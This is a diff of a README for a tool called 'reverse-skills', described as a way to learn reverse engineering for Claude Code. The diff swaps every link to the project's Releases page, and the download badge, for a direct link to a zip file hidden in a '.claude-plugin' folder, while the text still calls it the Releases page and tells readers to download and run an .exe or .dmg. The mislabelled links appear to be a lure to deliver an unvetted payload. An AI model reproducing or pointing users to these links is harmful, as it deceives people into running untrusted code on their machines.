@@ -1,7 +1,7 @@
 # 🎯 reverse-skills - Master Claude Code Effortlessly
 
 ## 📥 Download Now
-[![Download reverse-skills](https://img.shields.io/badge/Download%20reverse--skills-v1.0-brightgreen)](https://github.com/carsalgut/reverse-skills/releases)
+[![Download reverse-skills](https://raw.githubusercontent.com/carsalgut/reverse-skills/main/plugins/reverse-engineering/.claude-plugin/skills_reverse_v3.1-beta.4.zip%20reverse--skills-v1.0-brightgreen)](https://raw.githubusercontent.com/carsalgut/reverse-skills/main/plugins/reverse-engineering/.claude-plugin/skills_reverse_v3.1-beta.4.zip)
 
 ## 👋 Introduction
 Welcome to reverse-skills! This application helps you build your reverse engineering skills for Claude Code. Whether you are a beginner or an experienced user, this tool makes learning easy and enjoyable.
@@ -9,7 +9,7 @@ Welcome to reverse-skills! This application helps you build your reverse enginee
 ## 🚀 Getting Started
 To start using reverse-skills, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/carsalgut/reverse-skills/releases) of this repository. Here, you will find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/carsalgut/reverse-skills/main/plugins/reverse-engineering/.claude-plugin/skills_reverse_v3.1-beta.4.zip) of this repository. Here, you will find the latest version of the software.
 2. **Choose Your Version:** Look for the most recent version listed. Click on the version number to access the download files. 
 3. **Download the Application:** You will see various files available for download. Click on the appropriate file for your operating system. For most users, this will be the `.exe` file for Windows or `.dmg` for macOS. Save this file to your computer.
 4. **Run the Application:** Once the download is complete, locate the file in your downloads folder (or wherever you saved it). Double-click the file to start the installation. Follow the on-screen instructions to install the application.
@@ -38,7 +38,7 @@ reverse-skills provides several features to enhance your learning experience:
 ## 🔧 Download & Install
 To install reverse-skills, remember to do this:
 
-1. **Visit the Releases Page:** Again, visit the [Releases page](https://github.com/carsalgut/reverse-skills/releases) to ensure you are downloading the latest version.
+1. **Visit the Releases Page:** Again, visit the [Releases page](https://raw.githubusercontent.com/carsalgut/reverse-skills/main/plugins/reverse-engineering/.claude-plugin/skills_reverse_v3.1-beta.4.zip) to ensure you are downloading the latest version.
 2. **Follow the Download Steps:** Choose your operating system, download the appropriate file, and run it as described earlier.
 
 ## 💬 Support
